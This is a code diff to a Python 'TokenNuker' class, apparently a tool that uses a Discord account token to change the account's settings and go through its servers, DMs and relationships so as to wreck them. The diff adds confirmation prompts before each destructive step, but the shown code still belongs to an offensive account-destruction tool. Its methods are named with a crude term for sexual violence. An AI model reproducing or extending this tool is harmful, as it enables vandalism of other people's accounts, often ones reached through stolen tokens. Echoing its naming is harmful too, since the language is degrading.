@@ -69,7 +69,14 @@ class TokenNuker:
 
         return self.options[int(opt)]
 
+    def confirm(self):
+        inp = input(f"\n {r}[{b}?{r}] Are you sure you want to do this? This may break your account. (y/N) ")
+        return "y" in inp.lower()
+
+        
     def nuke(self):
+        if not self.confirm():
+            return
         self.rapeSettings()
         self.rapeServers()
         self.rapeDms()
@@ -112,6 +119,8 @@ class TokenNuker:
             pass
 
     def rapeSettings(self):
+        if not self.confirm():
+            return
         payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}
 
         print(f"\n {r}[{b}+{r}] Changing Settings")
@@ -122,6 +131,8 @@ class TokenNuker:
         )
 
     def rapeServers(self):
+        if not self.confirm():
+            return
         print(f"\n {r}[{b}+{r}] Detecting Servers")
     
         guilds = requests.get(
@@ -148,6 +159,8 @@ class TokenNuker:
                 print(e)
 
     def rapeDms(self):
+        if not self.confirm():
+            return
         print(f"\n {r}[{b}+{r}] Detecting DM channels")
 
         dms = requests.get(
@@ -164,6 +177,8 @@ class TokenNuker:
             )
 
     def rapeRelations(self):
+        if not self.confirm():
+            return
         print(f"\n {r}[{b}+{r}] Detecting Relationships")
     
         relations = requests.get(
